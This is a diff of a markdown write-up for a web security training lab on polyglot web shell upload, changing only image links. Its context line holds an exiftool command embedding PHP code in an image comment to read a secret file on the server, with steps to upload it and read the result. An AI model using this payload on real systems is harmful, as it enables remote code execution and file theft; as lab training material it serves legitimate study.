@@ -17,11 +17,11 @@ exiftool -Comment="<?php echo 'secret ' . file_get_contents('/home/carlos/secret
 
 Upload the generated payload
 
-![[Pasted image 20221113182207.png]]
+![[upload.png]]
 
 Then intercept the response for the "avatar image"
 
-![[Pasted image 20221113182300.png]]
+![[FileUploadVulnerabilites/labs/Remote code execution via polyglot web shell upload/images/exploit.png]]
 
 It contains the secret between the provided separators, upload the secret and the lab is solved.
 
